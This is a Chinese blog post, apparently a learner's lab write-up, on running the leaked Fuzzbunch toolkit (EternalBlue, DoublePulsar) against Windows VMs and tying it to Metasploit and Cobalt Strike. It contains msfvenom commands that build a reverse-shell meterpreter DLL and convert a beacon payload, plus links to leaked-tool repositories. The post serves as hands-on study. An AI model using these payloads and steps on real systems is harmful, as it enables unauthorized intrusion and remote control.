@@ -1,0 +1,491 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>初识Fuzzbunch | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="初识Fuzzbunch | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="武器库历史说明
+
+首先声明，都是本人初学踩坑总结，自然很多错误，大佬请指正，轻喷。
+
+首先说明一下武器库的关系，我也理了好久。关于shadowbroker和fuzzbunch。
+
+影子经纪（Shadow Brokers）声称攻破了为NSA开..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              初识Fuzzbunch
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-27
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/03/27/5f488045e08a5.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="武器库历史说明">武器库历史说明</h1>
+<blockquote>
+<p>首先声明，都是本人初学踩坑总结，自然很多错误，大佬请指正，轻喷。</p>
+</blockquote>
+<p>首先说明一下武器库的关系，我也理了好久。关于<code>shadowbroker</code>和<code>fuzzbunch</code>。</p>
+<blockquote>
+<p>影子经纪（<code>Shadow Brokers</code>）声称攻破了为NSA开发网络武器的美国黑客团队方程式组织（Equation Group）黑客组织的计算机系统，并下载了他们大量的攻击工具（包括恶意软件、私有的攻击框架及其它攻击工具）。</p>
+</blockquote>
+<p>方程式组织（<code>Equation Group</code>）是一个由卡巴斯基实验室发现的尖端网络犯罪组织，后者将其称为世界上最尖端的网络攻击组织之一，同震网（Stuxnet）和火焰（Flame）病毒的制造者紧密合作且在幕后操作。</p>
+<p>所以<code>shadowbroker</code>是影子组织公开的工具，其中包括了<code>fuzzbunch&amp;DanderSpritz</code>，不仅如此还有其他工具：</p>
+<ul>
+<li><strong>windows</strong>：包含Windows漏洞、后门、利用工具，等配置文件信息。</li>
+<li><strong>swift</strong>：包含来自银行攻击的操作说明</li>
+<li><strong>oddjob</strong>：与ODDJOB后门相关的文档</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/03/27/1865e3d3f198f.png" alt="" loading="lazy"></figure>
+<p>所以针对永恒之蓝的fuzzbunch工具包仅是沧海一粟，其中一部分。</p>
+<p>网上的资料良莠不齐，只能自己踩坑摸索，加上最近法律颁布，以后安全圈真大变革，以后又将会何去何从。</p>
+<h1 id="fuzzbunch">Fuzzbunch</h1>
+<p>这里有几个坑，由于是泄漏出来的版本，github存在极多分支，其中最主要就是<code>shadowbroker所有工具包</code>的和有仅有<code>fuzzbunch</code>。</p>
+<p><strong>shadowbroker：</strong></p>
+<ul>
+<li><a href="https://github.com/x0rz/EQGRP_Lost_in_Translation">https://github.com/x0rz/EQGRP_Lost_in_Translation</a></li>
+<li><a href="https://github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a>【fuzz少组件，没跑起】</li>
+</ul>
+<p><strong>fuzzbunch:</strong></p>
+<ul>
+<li><a href="https://github.com/fuzzbunch/fuzzbunch">https://github.com/fuzzbunch/fuzzbunch</a>【暂用这个】</li>
+<li><a href="https://github.com/exploitx3/FUZZBUNCH">https://github.com/exploitx3/FUZZBUNCH</a> 【有流程图，方便理解】</li>
+</ul>
+<p><strong>检测工具：</strong></p>
+<ul>
+<li><a href="https://github.com/countercept/doublepulsar-detection-script">https://github.com/countercept/doublepulsar-detection-script</a></li>
+</ul>
+<p>我在一个github找的shadowbroker工具跑的里面的buzzbunch没跑起来，原因后面找到了，是少了一些dll库，这些库还不好从网上找，还是后面另开炉灶，下了一个单独的fuzzbunch跑起的，从这目录下找到了那些遗失的windll库。</p>
+<p>在网上也找到类似报错，不同git仓库下，确实是不同，毕竟是泄漏版本，坑是巨多。</p>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/03/27/106bf61b20999.png" alt="" loading="lazy"></figure>
+<h2 id="硬性环境要求">硬性环境要求</h2>
+<p><strong>Prerequisites</strong>:</p>
+<ul>
+<li>
+<p>Windows 7以下</p>
+</li>
+<li>
+<p>Python2.6（必须为32位版本）和<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download">pywin32</a></p>
+</li>
+<li>
+<p>创建<code>listeningposts</code>目录；</p>
+</li>
+<li>
+<p>修改<code> FuzzBunch.xml</code><br>
+按需修改<code>Resources</code>，<code>logs</code></p>
+<blockquote>
+<p>建议修改logs为<code>c:\logs</code>，后续很省事。</p>
+</blockquote>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/03/27/2648de754f3c9.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+<h2 id="功能介绍">功能介绍</h2>
+<p>目标识别和利用漏洞发现：</p>
+<ul>
+<li>Architouch</li>
+<li>Rpctouch</li>
+<li>Domaintouch</li>
+<li>Smbtouch</li>
+</ul>
+<p>漏洞利用：</p>
+<ul>
+<li>EternalBlue</li>
+<li>Emeraldthread</li>
+<li>Eclipsedwing</li>
+<li>EternalRomance</li>
+</ul>
+<p>目标攻击后后操作：</p>
+<ul>
+<li>Douplepulsar</li>
+<li>Regread</li>
+<li>Regwrite</li>
+</ul>
+<p>其插件主要有以下几部分：</p>
+<ul>
+<li>Exploit 对应Windows目录下的\Exploits 目录，包括对Windows系统和应用软件的漏洞利用程序，主要是针对Windows系统SMB协议和对原Lotus （莲花公司，先已被IBM收购）邮件系统的攻击。</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/03/27/b6cb10dc38690.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Implant 对应Windows目录下的\implants目录，功能为向目标机器植入指定的dll或exe程序。</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/03/27/536034f27b544.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Payload 对应Windows目录下的\payloads 目录，该目录中的模块插件主要用于Exploit插件模块攻击成功后，后续的执行操作插件，包括在受害者机器上安装后门、枚举进程、增删改查注册表项、RPC服务等。</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://bu.dusays.com/2022/03/27/5e5f98f518bed.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Speical 对应Windows目录下的\specials 目录，该目录下Eternalblue和Eternalchampion的是比较新的2个针对Windows SMB协议的利用程序，但在微软3月的补丁MS17-010中也已经修复。</li>
+</ul>
+<figure data-type="image" tabindex="7"><img src="https://bu.dusays.com/2022/03/27/c47d7db6a8127.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Touch 对应Windows目录下的\touches 目录，主要功能是探测是否存在指定的漏洞，和Exploit插件模块功能相似，但该部分仅仅起扫描探测的作用，不包含漏洞利用功能。</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://bu.dusays.com/2022/03/27/5ae6bb1467a51.png" alt="" loading="lazy"></figure>
+<h2 id="smbtouch">Smbtouch</h2>
+<p>然后我们通过使用Smbtouch使用smb协议来检测对方操作系统版本、架构、可利用的漏洞。</p>
+<figure data-type="image" tabindex="9"><img src="https://bu.dusays.com/2022/03/27/34ff3394d7c3d.png" alt="" loading="lazy"></figure>
+<h2 id="eternalblue">Eternalblue</h2>
+<p><s>Attack (win10) : 10.211.55.8</s></p>
+<p>Attack(win7)：10.211.55.9</p>
+<p>靶机（win2k3)：10.211.55.4</p>
+<p>攻击机不能用Win10，打不成，换win7就好使。还是win7用起来舒服，动画看的也舒服也不消耗过多cpu资源。</p>
+<p>不会就help，打❓。</p>
+<p><code>use eternalblue</code>启动</p>
+<p>需注意几点</p>
+<ol>
+<li>这里记得选<code>1&gt; FB</code>，0是生成一个dll。</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://bu.dusays.com/2022/03/27/fdc9969698d49.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>重定向那个选项也要注意，不要选yes。参照下文**[小丑竟是我自己]**。</li>
+</ol>
+<p>通过返回的信息,可以看出攻击成功,用了不到10秒钟的时间，攻击成功之后并不能直接执行命令,需要用框架的其他的插件配合。</p>
+<p><strong>第一次打成功的截图：</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://bu.dusays.com/2022/03/27/6885a98e40345.png" alt="" loading="lazy"></figure>
+<p>之后重复打就会这样。</p>
+<figure data-type="image" tabindex="12"><img src="https://bu.dusays.com/2022/03/27/d8e7175af66db.png" alt="" loading="lazy"></figure>
+<p>攻击成功之后就可以开始使用DoublePulsar插件,DoublePulsar类似于一个注入器,有以下几个功能。</p>
+<p>Ping： 检测后门是否部署成功</p>
+<p>RUNDLL：注入dll。</p>
+<p>RunShellcode：注入shellcode</p>
+<p>Uninstall：用于卸载系统上的后门</p>
+<h1 id="doublepulsar">Doublepulsar</h1>
+<p>使用DoublePulsar配合上面的Eternalblue完成dll注入。</p>
+<p>注意:msf生成的dll注入到win7进程的时候，win7可能会重启。</p>
+<h2 id="msf上线">MSF上线</h2>
+<pre><code class="language-Bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.15 LPORT=4444 -f dll &gt; 4444.dll
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+use doublepulsar
+
+</code></pre>
+<p>第一次打失败了，弹了但是没有完全弹回。选的是SMB，x64，lsass.exe。</p>
+<figure data-type="image" tabindex="13"><img src="https://bu.dusays.com/2022/03/27/d8a0e52f3d2df.png" alt="" loading="lazy"></figure>
+<p><strong>遇到的一些问题：</strong></p>
+<ul>
+<li>发现msf的payload选错<br>
+msf反弹shell的地方没选payload，用的默认的，岂可修，已经好几次这样犯错了。可恶～！</li>
+<li>修改后再无法成功。<br>
+但我修改了之后还是没有成功，是不是之前已经注入过了，搞了没有办法重新注入。而且上面永恒之蓝的打法也是，打了一次就记住了，现在也不知道在哪删痕迹，都是陌生的一切。</li>
+</ul>
+<p>莫名原因重启之后，一切重来，一切正常。</p>
+<figure data-type="image" tabindex="14"><img src="https://bu.dusays.com/2022/03/27/5f488045e08a5.png" alt="" loading="lazy"></figure>
+<h2 id="cs上线">CS上线</h2>
+<p>但平时还是cs用得多一点。试试cs的dll效果如何。</p>
+<blockquote>
+<p>网上言论：“开始采用CS后门dll发现，执行使目标机器蓝屏重启几率较大，成功率较低。”</p>
+</blockquote>
+<h3 id="csdll盲目操作导致报错">cs—dll盲目操作导致报错</h3>
+<figure data-type="image" tabindex="15"><img src="https://bu.dusays.com/2022/03/27/866bf9607f88e.png" alt="" loading="lazy"></figure>
+<p>win7只要一打cs的dll，秒报错。</p>
+<figure data-type="image" tabindex="16"><img src="https://bu.dusays.com/2022/03/27/f7e6fe54a459e.png" alt="" loading="lazy"></figure>
+<h3 id="msf转换payload">msf转换payload</h3>
+<p>参考链接：<a href="http://www.dark5.net/blog/2019/06/26/Cobalt-Strike-DLL%E7%94%A8%E4%BA%8E%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%B3%A8%E5%85%A5/">http://www.dark5.net/blog/2019/06/26/Cobalt-Strike-DLL用于永恒之蓝注入/</a></p>
+<pre><code class="language-Bash">msfvenom -p generic/custom PAYLOADFILE=./beacon.bin -a x64 --platform windows -f dll -o csmsf.dll
+</code></pre>
+<p>注意cs的payload不能选windows那个，要选raw格式的dll。</p>
+<h3 id="小丑竟是我自己">小丑竟是我自己</h3>
+<p>打完cs之后，我发现上线的竟然是自己的攻击机Win7，我觉得不太对，IP都对着。怎么这样，重新打了一遍发现。小丑竟是我自己，自己上线自己。</p>
+<figure data-type="image" tabindex="17"><img src="https://bu.dusays.com/2022/03/27/b719bea21a629.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://bu.dusays.com/2022/03/27/1d5bfa2744df6.png" alt="" loading="lazy"></figure>
+<p>发现之前的设置当中，有这么一步设定。</p>
+<figure data-type="image" tabindex="19"><img src="https://bu.dusays.com/2022/03/27/08b42192ee0f5.png" alt="" loading="lazy"></figure>
+<h2 id="win2k8无法上线-没解决">win2k8无法上线 [没解决]</h2>
+<p><a href="https://beta.4hou.com/technology/12265.html">https://beta.4hou.com/technology/12265.html</a></p>
+<p>方程式可以上线，虽然报错，依旧上线。</p>
+<figure data-type="image" tabindex="20"><img src="https://bu.dusays.com/2022/03/27/bcdcad2e04954.png" alt="" loading="lazy"></figure>
+<p>DllOrdinal默认值为1，youtube演示视频为5。修改也没用。</p>
+<p><a href="https://www.youtube.com/watch?v=B8kkHAa_ntk&amp;t=248s">https://www.youtube.com/watch?v=B8kkHAa_ntk&amp;t=248s</a></p>
+<h1 id="doublespritz">DoubleSpritz</h1>
+<h2 id="0-前言">0. 前言</h2>
+<p>DanderSpritz是后渗透工具，伴随武器库一同泄漏，可配合fuzzbunch使用。</p>
+<p>在fuzzbunch攻击成功，在受害者机器上植入木马后，可以通过DanderSpritz对受害者机器进行远控制和操作。</p>
+<p>网上说明文档极少，都是大伙踩过坑的辛酸泪：<a href="https://github.com/francisck/DanderSpritz_lab">https://github.com/francisck/DanderSpritz_lab</a></p>
+<p>首先准备好合适的jdk版本环境。</p>
+<p><a href="https://3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95">https://3gstudent.github.io/NSA-DanderSpiritz测试指南-木马生成与测试</a></p>
+<h2 id="1-启动">1. 启动</h2>
+<pre><code class="language-Http">python start_lp.y
+java -jar start.jar
+
+</code></pre>
+<p>首次启动后，会出现日志目录报错，默认是<code>D:\logs</code>，修改后就能进入。</p>
+<figure data-type="image" tabindex="21"><img src="https://bu.dusays.com/2022/03/27/232f77ba673ac.png" alt="" loading="lazy"></figure>
+<p>但还是会有两行红字大错误。</p>
+<figure data-type="image" tabindex="22"><img src="https://bu.dusays.com/2022/03/27/66ca82778717b.png" alt="" loading="lazy"></figure>
+<p>网上查阅得知：设置启动参数，Log Directory需要设置成固定格式：c:\logs\xxx(xxx任意名称)</p>
+<p>建议设置成固定目录，我这里设置成了<code>c:\logs\1</code></p>
+<h2 id="2-生成木马">2. 生成木马</h2>
+<pre><code class="language-Http">pc_prep
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://bu.dusays.com/2022/03/27/a7826fdcdcdd3.png" alt="" loading="lazy"></figure>
+<pre><code class="language-Http">1) - Standard TCP (i386-winnt Level3 sharedlib)
+2) - HTTP Proxy (i386-winnt Level3 sharedlib)
+3) - Standard TCP (i386-winnt Level3 exe)
+4) - HTTP Proxy (i386-winnt Level3 exe)
+5) - Standard TCP (x64-winnt Level3 sharedlib)
+6) - HTTP Proxy (x64-winnt Level3 sharedlib)
+7) - Standard TCP (x64-winnt Level3 exe)
+8) - HTTP Proxy (x64-winnt Level3 exe)
+9) - Standard TCP Generic (i386-winnt Level4 sharedlib)
+10) - HTTP Proxy Generic (i386-winnt Level4 sharedlib)
+11) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib)
+12) - HTTP Proxy AppCompat-enabled (i386-winnt Level4 sharedlib)
+13) - Standard TCP UtilityBurst-enabled (i386-winnt Level4 sharedlib)
+14) - HTTP Proxy UtilityBurst-enabled (i386-winnt Level4 sharedlib)
+15) - Standard TCP WinsockHelperApi-enabled (i386-winnt Level4 sharedlib)
+16) - HTTP Proxy WinsockHelperApi-enabled (i386-winnt Level4 sharedlib)
+17) - Standard TCP (i386-winnt Level4 exe)
+18) - HTTP Proxy (i386-winnt Level4 exe)
+19) - Standard TCP (x64-winnt Level4 sharedlib)
+20) - HTTP Proxy (x64-winnt Level4 sharedlib)
+21) - Standard TCP AppCompat-enabled (x64-winnt Level4 sharedlib)
+22) - HTTP Proxy AppCompat-enabled (x64-winnt Level4 sharedlib)
+23) - Standard TCP WinsockHelperApi-enabled (x64-winnt Level4 sharedlib)
+24) - HTTP Proxy WinsockHelperApi-enabled (x64-winnt Level4 sharedlib)
+25) - Standard TCP (x64-winnt Level4 exe)
+26) - HTTP Proxy (x64-winnt Level4 exe)
+</code></pre>
+<p>其中Level代表回连方式</p>
+<ul>
+<li>level3表示反向连接，控制端监听端口，等待回连</li>
+<li>leve4表示正向连接，目标主机监听端口，等待控制端主动连接</li>
+</ul>
+<p><strong>不会，坑太多，溜了溜了。</strong><br>
+<strong>不会，坑太多，溜了溜了。</strong><br>
+<strong>不会，坑太多，溜了溜了。</strong></p>
+<h1 id="番外">番外</h1>
+<h2 id="17010莫名修复排查">17010莫名修复排查</h2>
+<p>本来一直存在17010的靶机，今天突然打不成了，我是惶恐不安呀，经过几番排查，的亏快照习惯好，恢复快照排查，发现后续安装软件的时候，存在这几个补丁。</p>
+<figure data-type="image" tabindex="24"><img src="https://bu.dusays.com/2022/03/27/0e1a6a78ea610.png" alt="" loading="lazy"></figure>
+<p>卸载补丁</p>
+<figure data-type="image" tabindex="25"><img src="https://bu.dusays.com/2022/03/27/b7cd8c720b8a8.png" alt="" loading="lazy"></figure>
+<p>nice，不亏耗费我快2小时，几个虚拟机疯狂调试，逐渐排查问题，排查出问题的结果还是令人相当有成就感的。</p>
+<p>关闭自动更新。over。nbplus。</p>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%AD%A6%E5%99%A8%E5%BA%93%E5%8E%86%E5%8F%B2%E8%AF%B4%E6%98%8E">武器库历史说明</a></li>
+<li><a href="#fuzzbunch">Fuzzbunch</a>
+<ul>
+<li><a href="#%E7%A1%AC%E6%80%A7%E7%8E%AF%E5%A2%83%E8%A6%81%E6%B1%82">硬性环境要求</a></li>
+<li><a href="#%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D">功能介绍</a></li>
+<li><a href="#smbtouch">Smbtouch</a></li>
+<li><a href="#eternalblue">Eternalblue</a></li>
+</ul>
+</li>
+<li><a href="#doublepulsar">Doublepulsar</a>
+<ul>
+<li><a href="#msf%E4%B8%8A%E7%BA%BF">MSF上线</a></li>
+<li><a href="#cs%E4%B8%8A%E7%BA%BF">CS上线</a>
+<ul>
+<li><a href="#csdll%E7%9B%B2%E7%9B%AE%E6%93%8D%E4%BD%9C%E5%AF%BC%E8%87%B4%E6%8A%A5%E9%94%99">cs—dll盲目操作导致报错</a></li>
+<li><a href="#msf%E8%BD%AC%E6%8D%A2payload">msf转换payload</a></li>
+<li><a href="#%E5%B0%8F%E4%B8%91%E7%AB%9F%E6%98%AF%E6%88%91%E8%87%AA%E5%B7%B1">小丑竟是我自己</a></li>
+</ul>
+</li>
+<li><a href="#win2k8%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BA%BF-%E6%B2%A1%E8%A7%A3%E5%86%B3">win2k8无法上线 [没解决]</a></li>
+</ul>
+</li>
+<li><a href="#doublespritz">DoubleSpritz</a>
+<ul>
+<li><a href="#0-%E5%89%8D%E8%A8%80">0. 前言</a></li>
+<li><a href="#1-%E5%90%AF%E5%8A%A8">1. 启动</a></li>
+<li><a href="#2-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC">2. 生成木马</a></li>
+</ul>
+</li>
+<li><a href="#%E7%95%AA%E5%A4%96">番外</a>
+<ul>
+<li><a href="#17010%E8%8E%AB%E5%90%8D%E4%BF%AE%E5%A4%8D%E6%8E%92%E6%9F%A5">17010莫名修复排查</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/P0avbGPkd/">
+              <h3 class="post-title">
+                内网代理转发实验
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
